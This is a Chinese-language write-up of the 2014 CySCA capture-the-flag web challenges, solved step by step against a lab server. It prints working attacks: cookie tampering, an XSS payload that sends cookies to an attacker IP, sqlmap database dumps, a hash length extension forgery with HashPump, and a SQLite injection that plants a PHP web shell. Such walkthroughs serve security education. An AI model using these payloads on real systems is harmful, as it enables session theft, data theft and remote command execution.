# 2014年澳大利亚信息安全挑战 CySCA CTF 官方write up Web篇

from:https://www.cyberchallenge.com.au/CySCA2014_Web_Penetration_Testing.pdf

0x00 背景
-------

* * *

一年一度的澳洲CySCA CTF是一个由澳洲政府和澳洲电信Telstra赞助的信息安全挑战赛，主要面向澳洲各大学的安全和计算机科学专业的学生。

CTF环境全部虚拟化并且需要openvpn才能进入。

0x01 第一题 非请勿入
-------------

* * *

说明：

一个只有VIP用户才能进去的blog，想办法进去后就能看到flag了。

解题:

打开burp和浏览器开始观察目标，我们发现了几个有意思的地方：

```
有个用户登录页面 login.php  
blog导航栏里有个博客页面的链接，但是是灰色的无法点击也打不开  
cookie有两个，PHPSESSID还有vip=0  
cookie没有http only，有可能被xss到  

```

vip=0，这有点明显，用burp或者浏览器cookie编辑工具把vip改成1，刷新页面后那个隐藏的链接可以打开了，打开后就是flag: ComplexKillingInverse411

0x02 第二题 好吃的小甜饼
---------------

* * *

说明:

用已任何已注册用户的身份成功登录blog。

解题:

翻了翻这个博客，又发现了几个好玩的地方:

```
可以看博客内容  
可以添加回复  
用户Sycamore似乎正在看第二篇博客 view=2  

```

Burp的内建插件 intruder可以用来在提交的参数里插入sql注入或者xss代码，Kali中自带了几个xss和sql注入的字典:

```
/usr/share/wfuzz/wordlist/Injections/SQL.txt   
/usr/share/wfuzz/wordlist/Injections/XSS.txt 

```

用这几个字典里的标准注入语句和xss代码对 GET view=?和 POST comment=?这两个参数过了一遍，没发现任何xss或者注入，于是我们决定对comment这个地方再仔细看看。

comment参数似乎过滤了不少东西，比如去掉了所有引号，转义了全部html特殊字符。但是似乎comment支持markdown语言里的斜体，粗体和链接标签，然后我们用burp intruder的xss测试在下面几个输入里面测试:

```
*test*   
*test*   
<test>   

```

果然成功了，在markdown链接标签的链接名称的地方存在XSS:

后续测试发现链接名称最长只能用30字符，翻了翻OWASP的XSS cheat sheet，

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

最短的是这个:

```
<SCRIPT SRC=//ha.ckers.org/.j>   

```

在Kali中，新建个文件 .j，里面放点偷cookie的js:

```
$.get('http://192.168.16.101?cookie='+document.cookie);  

```

然后在同目录下用python开个http服务器:

python ­-m SimpleHTTPServer 80

发送XSS payload`[<SCRIPT SRC=//192.168.16.101/.j>][1]`

然后坐等目标上钩...  
.  
.  
.  
等了这么久怎么还没有?  
原来是192.168.16.101这个ip太长了，payload被截断了……  
再仔细想想，好像很多浏览器支持十进制IP的,于是我们的payload变成了:

```
[<script src=//3232239717/.j>][1]   

```

好吧，其实还是超过了30位，不过比赛的时候这个长度被改成了75位所以无所谓了。

发送这个payload后，过了一会儿在控制台里出现了Python HTTP Server的日志:

```
172.16.1.80 ­ ­ [20/Feb/2014 16:11:07] "GET /.j HTTP/1.1" 200 ­   
172.16.1.80 ­ ­ [20/Feb/2014 16:11:12] "GET   
/?cookie=PHPSESSID=pm5qdd1636bp8o1fs92smvi916;%20vip=0 HTTP/1.1" 301

```

伪造cookie刷新后拿到flag: OrganicShantyAbsent505 

0x03 第三题 Nonce-Sense
--------------------

* * *

说明:

Flag在数据库里。

解题：

用上面用户的cookie登录后逛了一下，发现用户可以在自己的blog下面删除评论，这个功能是通过ajax POST到deletecomment.php实现的，提交的内容里有CSRF token。

CSRF token会被最先检查，如果不对的话会直接返回错误，这样导致对提交的参数进行自动化测试会比较困难，好在burp提供了宏这个功能，可以让我们自动采集CSRF token然后提交。

每次POST到deletecomment.php这个页面都会返回一个不同的CSRF token，下次提交的时候必须带着才行。

我们可以用burp里的session handler中的宏来抓取，我建议你先读一下这篇:

http://labs.asteriskinfosec.com.au/fuzzing-­and­-sqlmap­-inside-­csrf-­protected­-locations-­part­1/

通过SQL intruder插件，很快就可以发现在comment_id参数中存在SQL注入。

```
{"result":false,"error":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"' at line 1","csrf":"43b461afdd56f52f"}  

```

找到注入点后，拿上顺手的SQLMAP和Burp的proxy session宏结合起来，参考这里:

http://labs.asteriskinfosec.com.au/fuzzing-­and­-sqlmap­-inside-­csrf-­protected­-locations-­part­2/

把sqlmap的请求都保存到文件里，并且确保更新session cookie

```
#> sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id
...
[17:15:55] [WARNING] target URL is not stable. sqlmap will base the page
comparison on a sequence matcher. If no dynamic nor injectable parameters are
detected, or in case of junk results, refer to user's manual paragraph 'Page
comparison' and provide a string or regular expression to match on
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
...
[17:16:39] [INFO] heuristic (basic) test shows that POST parameter 'comment_id'
might be injectable (possible DBMS: 'MySQL')

...
heuristic (parsing) test showed that the back­end DBMS could be 'MySQL'. Do you
want to skip test payloads specific for other DBMSes? [Y/n] y
do you want to include all tests for 'MySQL' extending provided level (1) and risk
(1)? [Y/n] n
...
[17:17:13] [INFO] POST parameter 'comment_id' is 'MySQL >= 5.0 AND error­based ­
WHERE or HAVING clause' injectable
...
POST parameter 'comment_id' is vulnerable. Do you want to keep testing the others
(if any)? [y/N] n 

```

现在我们确认了sqlmap和burp都正确配置了，接下来就可以把库拖下来了。

```
#> sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id
­­current­db
current database:    'cysca'

#> sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id ­D
cysca ­­tables
Database: cysca

#> sqlmap ­r /root/sql­web3­headers
[5 tables]
+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­---------------------------------------+
| user                                  |
| blogs                                 |
| comments                              |
| flag                                  |
| rest_api_log                          |
+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­---------------------------------------+

#> sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id ­D
cysca ­T flag ­­dump
[1 entry]
+­­­­­­­­­­­­­­­­­­­­­­----------------------+
| flag                 |
+­­­­­­­­­­­­­­­­­­­­­­----------------------+
| CeramicDrunkSound667 |
+­­­­­­­­­­­­­­­­­­­­­­----------------------+

```

flag: CeramicDrunkSound667

0x04 第四题:Hypertextension
------------------------

* * *

说明：

在缓存控制面板里面找到flag。

解题:

控制面板是REST API的形式，在说明文档里面写了这个API有添加文件名然后读取文件内容的功能，也许我们能用这个功能来读取PHP源码?

首先需要找到API key，在上一题里似乎数据库中有个表名叫rest_api_log,我们用SQLMAP把表拖下来看看:

```
#> sqlmap ­r /root/sql­web3­headers ­­proxy=http://localhost:8080 ­p comment_id ­D cysca ­T rest_api_log ­­dump
Database: cysca
Table: rest_api_log
[4 entries] +­­­­+­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­ ­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­ ­+­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+
| id | method | params
| api_key | created_on | request_uri | +­­­­+­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­ ­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­ ­+­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+
|1 |POST | contenttype=application%2Fpdf&filepath=.%2Fdocuments%2FTop_4_Mitigations.pdf&api_s ig=235aca08775a2070642013200d70097a | b32GjABvSf1Eiqry | 2014­02­21 09:27:20 | \\/api\\/documents |
|2 |GET |_url=%2Fdocuments&id=2
| NULL
|3 |POST | contenttype=text%2Fplain&filepath=.%2Fdocuments%2Frest­api.txt&api_sig=95a0e7dbe06 fb7b77b6a1980e2d0ad7d | b32GjABvSf1Eiqry | 2014­02­21 11:54:31 | \\/api\\/documents |
|4|PUT | _url=%2Fdocuments&id=3&contenttype=text%2Fplain&filepath=.%2Fdocuments%2Frest­api­ v2.txt&api_sig=6854c04381284dac9970625820a8d32b | b32GjABvSf1Eiqry | 2014­02­21 12:07:43 | \\/api\\/documents\\/id\\/3 | +­­­­+­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­ ­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­ ­+­­­­­­­­­­­­­­­­­­­­­+­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+ 

```

利用里面的其中一条，放到curl里面测试一下，根据REST API的文档，curl命令应该是这样的:

```
#> curl ­X PUT ­d
'contenttype=text/plain&filepath=./documents/rest­api­v2.txt&api_sig=6854c04381284dac9970625820a8d32b' ­H 'X­Auth: b32GjABvSf1Eiqry'

http://172.16.1.80/api/documents/id/3

```

根据文档，api_sig的值是在php里面生成的:

```
hashlib.md5(secret+'contenttypetext/plainfilepath./documents/rest­api­v2.txtid3').  
hexdigest()  

```

secret作为双方都共享的值，后面加上目标文件的路径，生成的md5 hash作为api签名，在不知道secret的情况下，似乎无法利用任意路径生成合法的签名。

但是真的是这样么?

几年前著名应用 Flickr曾经因为Hash签名使用方法不正确结果掉进了很大的坑里，那就是 Hash长度扩展攻击(Hash length extension attack),导致可以在不知道API secret的情况下伪造任意请求。

关于Flickr的坑请看这里:

http://netifera.com/research/flickr_api_signature_forgery.pdf

Hash长度扩展攻击能够实现是因为 foo=bar 和 fo=obar 会产生一样的hash签名，所以我们可以生成一个可以让我们在原参数后面添加新参数，并且签名还是可以通过检验的。

比如这个请求:

```
"contenttype=text/plain&filepath=./documents/rest­api­v2.txt"   

```

如果我们把它改成:

```
"c=ontenttypetext/plain&filepath=./documents/rest­api­v2.txt&contenttype=text/plain&filepath=./index.php"  

```

那么在计算hash的时候字符串就会变成这样:

```
SECRETcontenttypetext/plainfilepath=./documents/rest­api­v2.txtcontenttype=text/plainfilepath=./index.phpid3  

```

因为数据在被hash的时候会被分割成固定长度的块，前面的块生成的hash会放入下一个块中和块的内容一起继续hash，直到最后一个块，最后一个块生成的hash就是我们最后得到的hash，也就是前面的api_sig。

现在我们知道了前面所有块产生的hash，如果我们自己再造一个块，把这个hash当成前面的块的hash放进我们自己建立的块中来hash一下会发生什么?

结果我们在不知道secret的情况下获得了可以在原文后添加任意内容并且产生合法hash的方法。

大部分web server在处理同样参数的不同内容时倾向于选择后面的，例如foo=1&foo=2，最后foo的值是2，但是有些web server也会使用前面的，这样这个方法是不是就不能用了?

根据这个API的文档，参数和值会拼接在一起然后一起hash，例如，foo=bar&foo1=bar1会被变成字符串foobarfoo1bar1，所以假如我们把foo=bar变成fo=obar，拼接后的字符串还是foobarfoo1bar，这样我们就可以完全控制需要更改的参数了。

现在开始利用这个漏洞，首先下载并且编译工具 HashPump (https://github.com/bwall/HashPump)，然后利用它来生成我们需要的hash。因为我们不知道secret的长度，所以需要穷举key的长度(hashpump的k参数)

```
#> ./hashpump ­s 6854c04381284dac9970625820a8d32b ­­data
contenttypetext/plainfilepath./documents/rest­api­v2.txtid3 ­a
contenttypetext/plainfilepath./index.phpid3 ­k 16
4625e458d07cb19da70effa3d1c6dc14
contenttypetext/plainfilepath./documents/rest­api­v2.txtid3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00X\x02\x00\x00\x00\x00\x00\x00contenttypetext/plainfilepath./index.phpid3 

```

我们把每次尝试k值生成的hash和字符串用curl提交到服务器，直到服务器提示成功为止，经过多次测试，我们发现k值是16.

```
#> curl ­-X PUT -­d
'c=ontenttypetext/plainfilepath./documents/rest­api­v2.txtid3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%02%00%00%00%00%00%00&contenttype=text/plain&filepath=./index.php&api_sig=4625e458d07cb19da70effa3d1c6dc14'  ­H 'X­Auth:b32GjABvSf1Eiqry' http://172.16.1.80/api/documents/id/3

```

接下来我们就成功获取了index.php的源码(成功的把index.php的源码作为document id 3 保存):

```
#> curl http://172.16.1.80/api/documents/id/3
<?php
// Not in production... see /cache.php?access=<secret>
include('../lib/caching.php');
if (isset($_GET['debug'])) {
readFromCache();
}
**** SNIP **** 

```

似乎这个cache.php有点意思，我们改改上面的hash长度攻击利用代码，把index.php换成cache.php,这次我们成功的拿到了flag。

```
#> curl http://172.16.1.80/api/documents/id/3
**** SNIP ****
$flag = 'OrganicPamperSenator877';
if ($_GET['access'] != md5($flag)) {
header('Location: /index.php');
die();
}
**** SNIP **** 

```

0x05 第五题:注入空间 Injeption（尼玛真难翻译）
-------------------------------

* * *

说明:

Web篇最后的flag藏在 /flag.txt里，你能拿到么?

解题:

上一题cache.php里面的源码最后写了，提交的参数access的值必须是上一题flag的md5，浏览器打开cache.php?access=f4fa5dc42fd0b12a098fcc218059e061 显示的是一个很简单的表单，表单提交了两个参数，URI和标题，在cache.php里面对这两个参数严格检查，比如URI参数前面必须是http://开头，服务器必须是本地，然后这个URI必须真实存在，不能是404.

标题被限制在40字符以内，但是不会过滤引号，似乎可以被注入。

我们尝试在标题里提交 /* ,返回了错误信息:

```
near "/*', '59ab7c9e3917a154ff56a43d08a262ab','http%3A%2F%2F172.16.1.80%2Findex.php', '...', datetime('now'))": syntax error

```

熟悉的SQL显错注入,根据错误信息，后端数据库似乎是SQLite，通过查看lib/caching.php的源码我们可以确认这一点，通过源码我们还可以看出，URI所指向的页面内容被直接存进了数据库中。

考虑到40个字符的限制不能进行任何有利用价值的SQL注入，我们需要找到一个可以注入长字符串的方法，页面内容输出缓存的功能现在派上用场了。

幸运的是，我们可以控制并且注入没转义过的单引号到缓存页面，并且把缓存页面自己缓存了，把在标题中的几个较短的注入语句拼接在一起，一个完整的注入语句就能在缓存页面被存入数据库的时候执行。

这里有个很好用的SQLite注入 cheat sheet，可以直接通过注入拿shell!

http://atta.cked.me/home/sqlite3injectioncheatsheet

我们的目标是利用这段注入语句拿到shell:

```
',0); ATTACH DATABASE 'a.php' AS a; CREATE TABLE a.b (c text); INSERT INTO a.b VALUES ('<? system($_GET[''cmd'']); ?>');/* 

```

我们如何用40个字符的长度注入122字符的SQL语句? SQL块注释!

这需要一些额外的转义并且把php的拼接指令'||'分开：

```
'',0);ATTACH DATABASE ''a.php'' AS a;/*
*/CREATE TABLE a.b (c text);INSERT /*
*/INTO a.b VALUES(''<? system($''||/*
*/''_GET[''''cmd'''']); ?>'');/*

```

当这些标题一个个出现在缓存页面中的时候，我们把缓存页面给缓存了，我们的注入语句就被执行了，并且生成了webshell a.php

我们现在就可以在服务器上执行任意指令了! 比如 cat /flag.txt

```
# > curl http://172.16.1.80/a.php?cmd=cat+/flag.txt   

```

CFlag: TryingCrampFibrous963 

Web篇完结。